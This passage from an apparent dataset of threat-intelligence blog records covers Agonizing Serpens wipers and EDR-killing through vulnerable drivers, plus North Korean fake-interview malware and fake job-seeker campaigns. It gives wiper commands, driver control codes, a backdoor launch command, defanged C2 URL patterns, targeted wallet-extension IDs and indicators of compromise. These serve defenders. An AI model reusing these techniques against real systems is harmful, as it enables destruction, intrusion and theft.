Directory Listing Implementation The recursive directory listing mechanism of MultiList is implemented in a similar manner to Fantasy and Apostle.\nThey share the same name for the function, named GetSubDirectoryFileListRecusrive.\nThey also both call GetSubDirectoryFileListRecusrive() and GetDirectoryFileList(), where GetSubDirectoryFileListRecusrive() is called recursively as shown in the code snippets in Figures 27 and 28.\nPartialWasher Wiper During the attack, the attackers attempted to use a second wiper, which they call PartialWasher or PW.\nFigure 29 shows that it was compiled on Oct. 8 and, unlike other .NET wipers mentioned in this article, it is written in C++.\nPartialWasher defines itself as a crucial process by calling NtSetInformationProcess, and it supports command-line arguments.\nIn case no arguments are provided, the default functionality would be a wiper functionality.\nWhen passing 1 as an argument, the attacker can then use an interactive command-line interface (CLI).\nThere are several typos in the interface’s text, indicating that the authors are likely not native English speakers.\nFigure 30 shows an example of the passed arguments S /p.\nThey trigger the malware to gather information about available drives on the infected machine.\nThe supported commands demonstrate the wiper’s further capabilities to perform individual wiping tasks at the request of its operators.\nThese commands include: - S - Scan drives and retrieve information about them, depending on the provided secondary argument - /a - Get all drive information and partition details - /p - Get only drive information - /v - Get only partition details - D - Write around 420 MB of binary data to a provided device number, most likely to make a drive unusable - F - Wipe files in a specified folder and its subfolders if the files are not empty - I - Wipe a specified file if it is not empty - W - Change file attributes and wipe files The attempt to execute PartialWiper was prevented by Cortex XDR, as depicted in Figure 31 below.\nBFG Agonizer Wiper The BFG Agonizer A third wiper that the attackers used is called BFG Agonizer (bfg.exe), according to its PDB path (E:\\tools2\\BFG agonizer\\INFECTOR\\Dropper\\Dropper\\Release\\Dropper.pdb).\nThe file metadata indicates that it was compiled on Oct. 8, as shown in Figure 32.\nIt is worth noting that there are many code similarities between BFG Agonizer and an open-source project called CRYLINE-v5.0, hosted on GitHub.\nWe assess that BFG’s authors copied, or at the very least, relied heavily on this publicly available code.\nBefore the wiper commences its wiping activity, it first attempts to circumvent security measures that might exist on the infected endpoint.\nIt does so by implementing several anti-hooking techniques, which have not been reported thus far as part of the group's known techniques.\nThis suggests a possible upgrade of their capabilities.\nThe following sections list the anti-hooking functions BFG runs before its main payload.\nDLL Unhooking DLL unhooking is an anti-hooking technique that attempts to remove the user mode inline hooks, which various security solutions often implement.\nThe technique works by restoring the bytes of the hooked functions to their original disk values.\nThis technique is well known, and it is likely that the wipers’ authors largely adopted the following publicly available code.\nImport Address Table (IAT) Unhooking IAT unhooking is an anti-hooking technique that attempts to remove the user-mode IAT hooks, which various security solutions often implement.\nBased on the wiper’s code, it is likely that the authors largely adopted publicly available IAT unhooking code snippets.\nWiping the Boot Sector To wipe the boot sector, the wiper retrieves a device handle to \\\\.\\PhysicalDrive0 as shown in Figure 33.\nIn turn, it calls DeviceIoControl with the IOCTL_DISK_GET_PARTITION_INFO control code to find the partition style.\nIf the partition style is master boot record (MBR) or GUID partition table (GPT) it infects the first 6 sectors as shown in Figure 34.\nFinally, after the sectors are infected, the wiper adjusts its privileges to have the SeShutdownPrivilege and calls the native API NtRaiseHardError, which triggers a blue screen of death (BSOD) in the system with the error code of 0xC0000420.\nOnce the system crashes, it will not be able to boot again (shown in Figure 35).\nThe attempt to execute BFG Agonizer wiper was prevented by Cortex XDR, as depicted in Figure 36 below.\nAttempted Anti-EDR Activity During the attack, the group specifically attempted to bypass EDR solutions to carry out their attack uninterrupted and with greater stealth.\nThese attempts were blocked by the Cortex XDR platform.\nIt is interesting to note that the group tried multiple tools and techniques, and each time they failed with one, they tried to leverage another.\nWhile most of the techniques are known and well-documented, the group has not used them in previous publicly reported attacks.\nThis could suggest that the group is becoming increasingly advanced and aggressive in its approach.\nThe following sections list some of the EDR bypass tools and techniques in the order they leveraged them.\nEDR Service Dependency Bypass The threat actor attempted their first EDR bypass technique on Oct. 6.\nThe actor tried to manipulate the Cortex XDR service auto-start functionally.\nBy leveraging previously obtained Administrator privileges, the attackers tried to modify the services Cortex XDR depends on, so it would not be able to auto-start upon system startup.\nFigure 37 shows these attempts were prevented, and then the attackers shifted into using custom tools that abuse the “bring your own vulnerable driver” (BYOVD) technique.\nDrvIX: A Custom BYOVD Loader The first custom tool the attackers used was a binary named agmt.exe, which was compiled on Oct. 7.\nAccording to its PDB path (C:\\Users\\dude\\source\\repos\\drvix\\x64\\Release\\drvix.pdb), it appears that this tool’s original name is drvIX (shown in Figure 38).\nHowever, according to the binary help function shown in Figure 39, the name is Drvtopia.\nAgmt.exe is a custom loader and operator for the GMER driver, gmer64.sys (renamed to AGMT.sys).\nGMER’s original intended purpose is to detect and remove rootkits; however, threat actors can also leverage it to remove security products.\nUsing agmt.exe, the attackers can specify the PID of the target process they wish to terminate via the command line.\nAgmt.exe starts by registering GMER a new kernel driver (agmt.sys) as a service named AGMT and starting it, which in turn causes the operating system to load the driver into the kernel.\nTo communicate and abuse the GMER functionality of terminating processes, agmt.exe retrieves a device handle to GMER’s device object as shown in Figure 40.\nThen, agmt.exe uses DeviceIoControl Windows API with the control code 0x9876C094, while specifying the PID in the Input_Buffer parameter of the call (shown in Figure 41).\nDeviceIoControl allows user mode processes to directly communicate with kernel drivers, allowing the processes to request the drivers to service certain operations for them.\nIn the case of agmt.exe, the DeviceIoControl API call triggers a process termination operation for the GMER driver.\nFigure 44 shows that by inspecting the GMER driver, we can determine that the functionality of the 0x9876C094 control code is to terminate the target process provided by PID.\nThe function opens a handle to the target process PID using ZwOpenProcess and then terminates it by calling ZwTerminateProcess.\nThe attempt to leverage the GMER driver failed, as shown in Figure 43 below.\nSecond Vulnerable Driver Attempt (Rentdrv2 Driver) As the attempt to exploit the GMER driver failed, the attackers tried arming their drvIX tool.\nThey did so using a different vulnerable driver from a new publicly available PoC tool called BadRentdrv2, first published in the beginning of October 2023.\nThe attacker used the same project and compiled a modified version of the tool a day later, on Oct. 8 as shown in Figure 44.\nThis time, the binary’s original name drvIX.exe was not changed.\nThe loading code of the driver looks almost identical to the aforementioned drvIX version.\nSimilarly, drvIX.exe accepts the PID of the target process the attacker wishes to terminate via the command line.\nDrvIX retrieves a device handle to its device object and communicates with the Rentdrv2 driver via DeviceIoControl.\nDrvIX then sends the target PID by specifying it in a structure sent as the Input_Buffer and specifies the control code as 0x22E010 (shown in Figure 45).\nSimilarly to the GMER driver, the 0x220E010 control code terminates the target process provided by its PID, as shown in Figure 46.\nThe function opens a handle to the target process PID using ZwOpenProcess and terminates it by calling ZwTerminateProcess.\nFigure 47 shows this attempt was blocked and prevented by the Cortex XDR platform.\nAttribution Based on the Unit 42 attribution model, we assess with a high level of confidence that the attacks described in this article were carried out by the Iranian-linked Agonizing Serpens APT group.\nThis assessment is based on the following reasons and evidence: - Multiple code similarities in wipers: The analysis of the MultiLayer wiper in this article shows multiple code similarities and similar naming convention to previously documented Agonizing Serpens wipers known as Apostle, its successor Fantasy, and the IPsec Helper backdoor. -\nCode similarity in web shells: The attackers used web shells variants that consisted of the same code, except for variable and function names that are replaced for each sample. -\nDestructive nature of the attacks: The final step of the attacks implements a “scorched earth” policy, using custom wipers to render the endpoints unusable and cover the tracks of the attackers.\nThis is congruent with all previous reports about the group’s activity. -\nTargeting Israeli organizations: Our telemetry did not detect non-Israeli organizations affected by the attacks.\nThis APT group seems to specifically target Israeli entities.\nConclusion In this article we provided a deep dive analysis of a recent destructive wiper attack carried out by the Iranian-linked Agonizing Serpens APT group.\nThis attack is a part of a broader offensive campaign that targets Israeli organizations.\nBased on our telemetry, the most targeted organizations belong to the education and technology sectors.\nOur investigation uncovered new tools in the group’s arsenal that include a set of three previously undocumented wipers, as well as a database extractor tool.\nAnalysis of the new wipers revealed that the group has upgraded their capabilities, putting an emphasis on stealth and evasive techniques designed to bypass security solutions such as EDR technology.\nAs shown throughout our research, the Cortex XDR platform can detect and prevent the various stages of the attack lifecycle.\nProtections and Mitigations Palo Alto Networks customers receive protection from the different tools that were observed during the recent Agonizing Serpens campaign.\nThe Cortex XDR and XSIAM platforms detect and prevent the execution flow described in the screenshots included in the previous section.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this group.\nCortex XDR and XSIAM detect user and credential-based threats by analyzing user activity from multiple data sources including the following: - Endpoints - Network firewalls - Active Directory - Identity and access management solutions - Cloud workloads Cortex XDR and XSIAM build behavioral profiles of user activity over time with machine learning.\nBy comparing new activity to past activity, peer activity and the expected behavior of the entity, Cortex XDR and XSIAM detect anomalous activity indicative of credential-based attacks.\nThey also offer the following protections related to the attacks discussed in this post: - Prevent the execution of known malicious malware and also prevents the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module - Protect against credential gathering tools and techniques using the new Credential Gathering Protection available from Cortex XDR 3.4 - Protect against exploitation of different vulnerabilities including ProxyShell and ProxyLogon using the Anti-Exploitation modules as well as Behavioral Threat Protection Cortex XDR Pro detects post-exploitation activity, including credential-based attacks, with behavioral analytics.\nIf you think you might have been impacted or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise Web shells - 1ea4d26a31dad637d697f9fb70b6ed4d75a13d101e02e02bc00200b42353985c - 62e36675ed7267536bd980c07570829fe61136e53de3336eebadeca56ab060c2 - abfde7c29a4a703daa2b8ad2637819147de3a890fdd12da8279de51a3cc0d96d Nbtscan - 63d51bc3e5cf4068ff04bd3d665c101a003f1d6f52de7366f5a2d9ef5cc041a7 WinEggDrop - 49c3df62c4b62ce8960558daea4a8cf41b11c8f445e218cd257970cf939a3c25 NimScan - dacdb4976fd75ab2fd7bb22f1b2f9d986f5d92c29555ce2b165c020e2816a200 - e43d66b7a4fa09a0714c573fbe4996770d9d85e31912480e73344124017098f9 Mimikatz - 2a6e3b6e42be2f55f7ab9db9d5790b0cc3f52bee9a1272fc4d79c7c0a3b6abda ProcDump - 5d1660a53aaf824739d82f703ed580004980d377bdc2834f1041d512e4305d07 - f4c8369e4de1f12cc5a71eb5586b38fc78a9d8db2b189b8c25ef17a572d4d6b7 Plink - 13d8d4f4fa483111e4372a6925d24e28f3be082a2ea8f44304384982bd692ec9 Sqlextractor - a8e63550b56178ae5198c9cc5b704a8be4c8505fea887792b6d911e488592a7c Pscp.exe - a112e78e4f8b99b1ceddae44f34692be20ef971944b98e2def995c87d5ae89ee MultiLayer wiper - 38e406b17715b1b52ed8d8e4defdb5b79a4ddea9a3381a9f2276b00449ec8835 - f65880ef9fec17da4142850e5e7d40ebfc58671f5d66395809977dd5027a6a3e PartialWasher Wiper - ec7dc5bfadce28b8a8944fb267642c6f713e5b19a9983d7c6f011ebe0f663097 BFG Agonizer Wiper - c52525cd7d05bddb3ee17eb1ad6b5d6670254252b28b18a1451f604dfff932a4 GMER Driver Loader - agmt.exe - 8967c83411cd96b514252df092d8d3eda3f7f2c01b3eef1394901e27465ff981 - a2d8704b5073cdc059e746d2016afbaecf8546daad3dbfe4833cd3d41ab63898 GMER Driver - 18c909a2b8c5e16821d6ef908f56881aa0ecceeaccb5fa1e54995935fcfd12f7 Rentdrv2 Loader - drvIX.exe - 2fb88793f8571209c2fcf1be528ca1d59e7ac62e81e73ebb5a0d77b9d5a09cb8 Rentdrv2 Driver - 9165d4f3036919a96b86d24b64d75d692802c7513f2b3054b20be40c212240a5 Infrastructure - 185.105.46[.]34 - 185.105.46[.]19 - 93.188.207[.]110 - 109.237.107[.]212 - 217.29.62[.]166 - 81.177.22[.]182 Appendix | Filename | SHA256 | | Uploader.aspx | 1ea4d26a31dad637d697f9fb70b6ed4d75a13d101e02e02bc00200b42353985c | | xcopy.aspx | 62e36675ed7267536bd980c07570829fe61136e53de3336eebadeca56ab060c2 | | css.aspx | abfde7c29a4a703daa2b8ad2637819147de3a890fdd12da8279de51a3cc0d96d | Table 1.\nWeb shell hash.\nAdditional References - From Wiper To Ransomware: The Evolution Of Agrius – Amitai Ben Shushan Ehrlich, SentinelLABS Research Team - Fantasy – a new Agrius wiper deployed through a supply-chain attack – WeLiveSecurity, ESET - Agrius Deploys Moneybird in Targeted Attacks Against Israeli Organizations – cp , Check Point","num_sentences":179,"metadata":{"source":"blog","platform":"Unit42","filename":"Agonizing-Serpens"}}
{"id":70,"title":"Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors","publish_date":"2022-12-28","link":"https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/","clean_text":"Executive Summary Unit 42 researchers recently discovered two separate campaigns targeting job-seeking activities linked to state-sponsored threat actors associated with the Democratic People’s Republic of Korea (DPRK), commonly known as North Korea.\nWe call the first campaign “Contagious Interview,” where threat actors pose as employers (often anonymously or with vague identities) to lure software developers into installing malware through the interview process.\nThis malware creates the potential for various types of theft.\nWe attribute with moderate confidence that Contagious Interview is run by a North Korea state-sponsored threat actor.\nWe call the second campaign “Wagemole,” where threat actors seek unauthorized employment with organizations based in the US and other parts of the world, with potential for both financial gain and espionage.\nWe attribute with high confidence that Wagemole is a North Korea state-sponsored threat.\nActivity from both campaigns remains an ongoing active threat.\nWe nicknamed the first campaign Contagious Interview because the threat actor attempts to infect software developers with malware through a fictitious job interview.\nWe originally discovered Contagious Interview through customer telemetry, and our research indicates it started as early as December 2022.\nSome of the infrastructure supporting this campaign remains active, and this activity remains a consistent threat.\nThe first campaign's objective is likely cryptocurrency theft and using compromised targets as a staging environment for additional attacks.\nWe track Contagious Interview as CL-STA-0240.\nWhile pivoting on indicators from Contagious Interview, we discovered exposed files on a different threat actor-controlled infrastructure.\nThese files indicate fraudulent job-seeking activity targeting a wide variety of United States (US) companies.\nThis trove of information includes resumes with different technical skill sets and multiple identities impersonating individuals from various nations.\nIt also includes common job interview questions and answers, scripts for interviews and downloaded job postings from US companies.\nWe call this separate campaign \"Wagemole\" and track it as CL-STA-0241.\nWhile we cannot determine the objective of this campaign, the US Department of Justice and Federal Bureau of Investigation (FBI) have reported that North Korea uses remote workers to funnel wages to its weapons programs.\nDuring our investigation of Contagious Interview, we discovered two new families of malware we named BeaverTail and InvisibleFerret.\nBeaverTail is JavaScript-based malware hidden inside Node Package Manager (NPM) packages.\nInvisibleFerret is a simple but powerful Python-based backdoor.\nBoth are cross-platform malware that can run on Windows, Linux and macOS.\nThis article provides an overview of these two campaigns, and we examine the two new malware families, BeaverTail and InvisibleFerret.\nThis article also provides insight on how these threat actors are both seeking jobs and targeting job seekers to accomplish their goals.\nWe provide recommendations for both job applicants and employers to consider when interviewing or applying for remote jobs.\nFor example: - Don’t use company-issued computers for personal activities. -\nBe wary of GitHub accounts with few repositories or updates. -\nConfirm the legitimacy of companies you’re applying for. -\nThoroughly vet the identity of job applicants.\nPalo Alto Networks customers receive protection from the malware discussed in this article through our Next-Generation Firewall with Cloud-Delivered Security Services, including Advanced WildFire, DNS Security and Advanced URL Filtering.\n| Related Unit 42 Topics | Contagious Interview, DPRK, North Korea, Wagemole, Invisible Ferret, BeaverTail | CL-STA-0240: Contagious Interview While investigating our telemetry, we discovered suspicious activity as early as March 2023 related to previously unidentified malware samples.\nOur investigation revealed two new malware families, and tactics used in this campaign align with previously reported activity by North Korean threat actors, as noted in our Attribution section.\nWe track this campaign as Contagious Interview or CL-STA-0240, and infrastructure for this campaign was established as early as December 2022.\nThrough advertisements on job search platforms, the threat actor behind CL-STA-0240 targets software developers by posing as a prospective employer.\nThe advertisements we can tie to this campaign are often anonymous or purposefully vague, with no real indicator of the employer they represent.\nBased on some of the file names of malware associated with this campaign, we believe this threat actor might also impersonate legitimate AI, cryptocurrency and NFT-related companies or recruitment agencies.\nLike other threat actors, this threat actor could also reach potential victims through email, social media platforms, or chat channels on community forums used by software developers.\nAfter establishing contact, the threat actor invites the victim to participate in an online interview.\nThe threat actor likely uses video conferencing or other online collaboration tools for the interview.\nDuring the interview, the threat actor convinces the victim to download and install an NPM-based package hosted on GitHub.\nThe threat actor likely presents the package to the victim as software to review or analyze, but it actually contains malicious JavaScript designed to infect the victim’s host with backdoor malware.\nBelow, Figure 1 summarizes the chain of events for CL-STA-0240.\nTo better understand this chain of events, we should first understand how the threat actor abused GitHub for this campaign.\nGitHub Abuse for Contagious Interview Designed as a collaborative space for software developers, GitHub is attractive to many developers because its basic service option is free.\nThis also makes GitHub attractive to criminals.\nThe threat actor behind Contagious Interview is one of many criminals who have used GitHub’s free service plan to host innocent-looking repositories and use them as powerful tools for compromise.\nThe threat actor behind Contagious Interview created different identities to host a number of GitHub repositories, establishing an infrastructure to inspire trust by its intended victims.\nHowever, a closer examination reveals that these GitHub repositories are not as trustworthy as they might initially appear.\nThe free GitHub accounts used for Contagious Interview have only one repository that is not updated, while many legitimate software developers host multiple repositories with several updates.\nFurther examination of suspicious repositories found during our investigation confirmed our initial assessment.\nA GitHub repository’s Issues section often provides clues.\nBelow, Figure 2 shows comments in the Issues section of a repository used in Contagious Interview.\nThe repository named react-ecommerce was established under a GitHub user account named brainjobs35.\nThis repository and account are no longer active.\nGitHub’s Insights feature also provides clues.\nBelow Figure 3 shows GitHub users commenting through the Insights feature about a malicious file named ServiceWorker.js related to the Contagious Interview campaign.\nNPM, Open Source and Supply Chain Attacks Software developers increasingly rely on third-party packages and libraries to streamline their projects.\nThese provide an avenue for supply chain attacks.\nAmong these packages, NPM is a central hub for countless projects using JavaScript, with 17 million developers worldwide according to the NPM website.\nThe open-source nature of NPM helps malicious actors find ways to inject harmful code in legitimate NPM packages and distribute these packages through GitHub.\nOnce installed, these compromised NPM packages act as subtle backdoors, granting threat actors unauthorized access into targeted networks.\nGitHub and Phylum have recently reported similar attacks.\nMalicious NPM packages help the threat actor elude most traditional detection techniques, because: - Most static and dynamic analysis detection engines cannot execute an NPM package in a Node.js runtime environment because this is not a supported file type. -\nCloning a repository and running Node.js code is a normal, allowed operation in most software development teams that will not be considered suspicious.\nAs a result, malicious JavaScript files in these NPM packages have a low or zero detection rate when submitting to a service like VirusTotal.\nFurthermore, NPM can be easily installed on multiple operating systems, allowing threat actors to maximize their attack surface when distributing a malicious NPM package.\nThe Act of Compromise During the interview process, victims prepare their development environment.\nIn the attacks we investigated, most developers used Visual Studio Code with a set of plugins like Code Helper, along with Git and Node.js extensions.\nThis includes NPM.\nAfter these basic system requirements are met, the threat actor asks the victim to install the malicious NPM package posing as legitimate software on GitHub.\nThis malicious NPM package contains JavaScript for newly discovered malware we have named BeaverTail.\nBeaverTail steals information, and it retrieves additional malware as its second-stage payload.\nThis payload is a cross-platform backdoor we have named InvisibleFerret.\nThe next section provides analysis and insight into the loader, BeaverTail.\nBeaverTail Analysis Distributed as JavaScript inside NPM packages, BeaverTail serves two purposes. -\nInformation stealer - Loader As an information stealer, BeaverTail targets cryptocurrency wallets and credit card information stored in the victim’s web browsers.\nAs a loader, BeaverTail retrieves and runs the next stage of malware, InvisibleFerret.\nThe BeaverTail JavaScript file inside an NPM package is heavily obfuscated to evade detection.\nThe threat actor might upload an entire malicious NPM package to GitHub or they might also inject BeaverTail code into other developer’s legitimate NPM projects.\nFigure 4 shows an example of this injected script.\nIn addition to the heavily obfuscated code illustrated in Figure 4, the BeaverTail also requires human interaction to execute due to its dependency on the Node.js environment.\nThese characteristics help the malware to evade detection.\nOnce the malicious NPM package is successfully installed on a Windows, Linux or macOS host, BeaverTail collects basic system information.\nThis threat also searches the victim’s web browser for extensions associated with cryptocurrency wallets, like Binance and Coinbase.\nTable 1 shows the full list below.\n| Browser Extension ID | Browser Extension Name | Target Browser | | fhbohimaelbohpjbbldcngcnapndodjp | Binance Wallet | Chrome | | aeachknmefphepccionboohckonoeemg | Coin98 Wallet | Chrome | | hnfanknocfeofbddgcijnmhnfnkdnaad | Coinbase Wallet | Chrome | | hifafgmccdpekplomjjkcfgodnhcellj | Crypto.com Wallet | Chrome | | nkbihfbeogaeaoehlefnkodbefgpgknn | Metamask Wallet | Chrome | | ejbalbakoplchlghecdalmeeeajnimhm | MetaMask Wallet | Microsoft Edge | | bfnaelmomeimhlpmgjnjophhpkkoljpa | Phantom Wallet | Chrome | | fnjhmkhhmkbjkkabndcnnogagogbneec | Ronin Wallet | Chrome | | ibnejdfjmmkpcnlpebklmnkoeoihofec | TRON Wallet | Chrome | Table 1.\nBrowser extensions for cryptocurrency wallets BeaverTail searches for.\nBeaverTail also checks for a Solana cryptocurrency wallet, searching for ~/.config/solana/id.json.\nWhile performing data exfiltration and loading InvisibleFerret, BeaverTail generates the following web traffic as described below in Table 2.\n| URL Pattern | Description | Save Location | | hxxp:// | HTTP POST request sends data collected by BeaverTail | Not applicable | | hxxp:// | HTTP POST request sends other collected information like Solana cryptocurrency wallet data | Not applicable | | hxxp:// | HTTP GET request for helper DLL files when decrypting credentials stored in Chrome, if needed | %USERPROFILE%\\store.node | | hxxp:// | HTTP GET request for Python executable and associated libraries | %TEMP%\\p.zi or %HOMEPATH%\\.pyp\\ | | hxxp:// | HTTP GET request for InvisibleFerret | %HOMEPATH%\\.npl or ~/.npl | Table 2.\nInfection traffic generated by BeaverTail malware.\nAt this stage, the threat actor has been able to successfully drop a silent, simple and cross-platform backdoor on the victim machine.\nInvisibleFerret: A Cross-Platform Python Backdoor InvisibleFerret is newly discovered malware retrieved and executed by BeaverTail NPM packages.\nCross-platform malware written in Python, InvisibleFerret consists of various components with the following functions: - Fingerprinting - Remote control - Keylogging - Data exfiltration - Browser stealing capabilities - Downloading the AnyDesk client if required for additional control Figure 5 presents a diagram that reveals the modular nature of InvisibleFerret, showing an initial script and two additional components that perform different functions.\nInitial Script BeaverTail downloads the InvisibleFerret script using the URL structure from the final row in Table 2.\nAn example of a URL to download InvisibleFerret follows: - hxxp:// :1224/client/ The initial script for InvisibleFerret is saved under the user’s home directory, named .npl and executed using Python.\nAn example of the command line to run this file on a Windows host is: - C:\\Users\\$USER$\\.pyp\\python.exe C:\\Users\\$USER$\\.npl The initial script for InvisibleFerret uses obfuscated data.\nAn example is shown below in Figure 6.\nThe bottom section of Figure 6 shows a decoding routine that is consistent across all script files used for InvisibleFerret and its components: - The first eight characters of the temp string represent a key for decoding. -\nThe remainder of the temp string is converted from Base64. -\nThe result is processed through an XOR loop using the eight character key.\nThis initial script installs the required Python modules using pip, and it also defines variables, establishing values to identify the command and control (C2) server and port.\nThe main objective of the initial script is to retrieve and run two different components of InvisibleFerret.\nThese components are downloaded and saved as shown in Table 3.\n| Request for Component | Save Location | | hxxp:// | Local file path .n2/pay | | http:// | Local file path .n2/bow | Table 3.\nInfection traffic generated by BeaverTail malware.\nOf note, the second component is only downloaded when the operating system is not macOS.\nInvisibleFerret Components The first component for InvisibleFerret collects system data to create a fingerprint, then sends this data to a C2 server.\nThe first component collects: - Internal IP address - IP geolocation information - System information including OS version, release, host and user information It sends this information to the server in JSON format.\nThe second component for InvisibleFerret deploys remote control and information stealing capabilities.\nOnce executed, it prepares the environment by installing the following Python packages, if they are not already present on the system: - pyWinhook: Python wrapper for out-of-context input hooks in Windows that provides callbacks for global mouse and keyboard events. -\npyperclip: Cross-platform Python module for copy and paste clipboard functions. -\npsutil: Cross-platform Python library for process and system monitoring. -\npywin32: Python for 32-bit Windows extensions.\nC2 Communications InvisibleFerret establishes a connection with the C2 server over TCP traffic and periodically checks in and waits for further instructions.\nThis traffic consists of JSON messages.\nThe infected host checks in using heartbeat messages with JSON content using code and args keys with a code value of 0 as illustrated below in Figure 7.\nThis heartbeat message also contains a campaign identifier (sType) and the victim’s hostname (sHost).\nThe C2 server returns JSON data instructing the backdoor with the next actions to take.\nThe JSON response contains the same two main keys: - code: A value specifying an action or command - args: A string or JSON dictionaries with multiple key value pairs containing the required arguments for the specified command InvisibleFerret implements a total of eight commands described below in Table 4.\n| Command | Description | | ssh_cmd | Checks if the args value is equal to delete and if so, closes the session.\nTo notify the C2 server, it sends the message string [close].\n| | ssh_obj | Command execution.\nExtracts the command value from args['cmd'] and runs it.\nJSON results sent to the C2 server with code value 1 and args indicating the results.\n| | ssh_clip | Send contents of keylogger buffer and clipboard data.\nReports to C2 server with JSON code value 3 and args containing the collected data.\n| | ssh_run | Downloads and runs the browser stealer component.\nReports to C2 server with JSON code value 4 and args containing the file path for this component.\n| | ssh_upload | Upload data to a C2 server.\nSubcommands include: Contents are uploaded to an actor-controlled FTP server, provided in the JSON response using the following args: The logic contains exclusion lists for specific files and folders as well as a list of paths that are specifically uploaded when found.\nThese paths show focus not only in documents (.xls, .doc, etc.)\nbut also in cryptocurrency specific file paths (metamask, wallet, etc.).\nWhile uploading contents, the backdoor keeps sending requests with JSON data with code value 5 and args value indicating the state of the upload.\n| | ssh_kill | Kill Chrome and Brave browser processes.\nWhen done, send JSON with code value 6 and args value indicating these processes are terminated.\n| | ssh_any | Download and run a malicious binary for AnyDesk.\nBefore downloading AnyDesk, send JSON containing code value 7 and args value to indicate the victim’s OS.\n| | ssh_env | Collect content specific folders (“Documents” and “Downloads” for Windows, /home and /Volumes for others) and upload these files to the FTP server.\n| Table 4.\nCommands for InvisibleFerret.\nWhen InvisibleFerret finishes its tasks, it reports the results to the C2 server.\nThis report uses the same JSON code and args parameters with specific values outlined above in Table 4.\nKeylogger Functionality InvisibleFerret also starts a keylogger to continually collect keyboard, mouse and clipboard data in a buffer that can be requested at any time from the C2 server using the command ssh_clip described above.\nBrowser Stealer Functionality Based on Python, InvisibleFerret targets popular web browsers on Windows, Linux and macOS to steal login credentials and other sensitive data.\nThis functionality includes retrieving a browser’s login data, decrypting the information and stealing the victim’s login credentials.\nInvisibleFerret can also retrieve credit card information used by the victim through a web browser.\nAfter collecting this information, InvisibleFerret sends the data to a C2 server using the JSON format with various keys representing the content, as shown below in Figure 8.\nFollow-Up Malware: AnyDesk When the ssh_any command is received, InvisibleFerret downloads an additional script using the following URL pattern: - http:// :1224/adc/ This script is stored on the C2 server with the following filename: - any_ .py InvisibleFerret stores the file on disk for execution under the following directory. -\n.n2/adc This file uses the same obfuscation seen in other scripts used for InvisibleFerret.\nThis script retrieves an AnyDesk binary from the C2 server if it is not already present on the victim’s host.\nThis process updates AnyDesk’s configuration and restarts the program if it was already running.\nWhile pivoting on infrastructure associated with this Contagious Interview campaign, we discovered files used for a separate activity.\nWe have nicknamed this separate campaign “Wagemole” and track it as CL-STA-0241.\nCL-STA-0241: Wagemole While pivoting on GitHub infrastructure associated with Contagious Interview (CL-STA-0240), we discovered files accidentally exposed on a GitHub repository on a different GitHub account.\nThese files include: - Resumes with fake identities, impersonating individuals of various nationalities - Frequently asked job interview questions and answers - Self-introduction scripts including personal information of the impersonated identity - Copies of IT job opening posts from US companies - Scanned copy of a stolen US Permanent Resident Card - A list of unidentified account seller contacts Timestamps on the files indicate this campaign started as early as August 2022, and the timestamps run through early December 2022.\nWhile we have not noticed further updates for this batch of files, this activity remains an ongoing threat.\nThese files indicate another campaign applying for remote IT jobs using fake identities, which we are calling Wagemole.\nInformation from some of the documents indicate this threat actor is associated with North Korea.\nResumes from these files indicate targets include a wide range of US companies and freelance job marketplaces.\nThis activity is likely related to a recent report that North Korea uses remote workers to funnel wages to its weapons programs.\nBelow, Figure 9 shows one of the resumes.\nEach fake resume has a different US phone number for personal contact, specifically using Voice over Internet Protocol (VoIP) numbers.\nSome resumes include links to a LinkedIn profile and links to GitHub content.\nFigure 10 shows a GitHub repository one of the job seekers has maintained.\nThese GitHub accounts appear well maintained and have a lengthy activity history.\nThese accounts indicate frequent code updates and socialization with other developers.\nAs a result, these GitHub accounts are nearly indistinguishable from legitimate accounts.\nA portion from one of the phone interview preparation scripts is shown below in Figure 11.\nThis document indicates the target is a job that requires at least some on-site presence.\nAs indicated in Figure 11, the job seeker claims to be based in the US and tells the interviewer they are currently out of the country visiting family overseas due to COVID but can start working remotely.\nThese documents are not limited to remote IT jobs at US-based companies.\nSome of the documents indicate this threat actor also seeks freelance jobs in multiple marketplaces, targeting a broader scale of global markets that include Africa.\nThese fraudulent job seekers have maintained multiple accounts for email, freelance websites, source code repositories and job agency platforms.\nAs a tactic to win job bids and hide their true identity, these job seekers have also sought to purchase or borrow accounts with a high reputation in account seller marketplaces.\nFigure 12 shows a message on a freelance job platform from one of the job seekers used in this campaign.\nFigure 13 shows message activity with an underground marketplace seeking to purchase or rent high reputation accounts on freelance job platforms.\nAmong the copies of US job postings hosted on this infrastructure, the largest portion is for IT and recruiting.\nJobs for IT services and solutions might provide the threat actor behind Wagemole additional opportunities for downstream supply chain attacks.\nRecruiting jobs could provide more personal identity materials such as job applicant IDs, resumes and other personal data that attackers could further use in the Wagemole campaign.\nAttribution The tactics, techniques and procedures (TTPs) observed in both Contagious Interview (CL-STA-0240) and Wagemole (CL-STA-0241) align with previous activity attributed to North Korea state-sponsored APTs.\nHowever, the confidence level of our attribution is different for the two campaigns.\nFor Wagemole activity, several of the documents we discovered contain information that more definitively points to North Korea.\nMany of the passwords associated with these documents were made through Korean language typed on a US keyboard, and some passwords include words only used in North Korea.\nFurthermore, Korean keyboard language settings were found on computers used by threat actors behind these campaigns.\nThese documents indicate similar activity as reported by numerous media outlets based on US government and FBI announcements.\nFor these reasons, we assess with high confidence that Wagemole can be attributed to a North Korea-sponsored APT, which we track as CL-STA-0241.\nContagious Interview also bears the hallmarks of a North Korean threat actor.\nFor example, a North Korean group previously posed as job recruiters for Meta using similar tactics to infect job seekers with malware.\nOperation Dream Job run by the North Korean APT Lazarus Group reportedly used social media to trick victims into installing a trojanized VNC app as part of a fake job interview.\nNorth Korea-sponsored APT groups have often posed as job recruiters to infect potential victims with backdoor malware.\nIn the course of our research into Contagious Interview, we also observed indicators that the developer of BeaverTail and InvisibleFerret corresponded or collaborated with other GitHub accounts, where we found direct association with 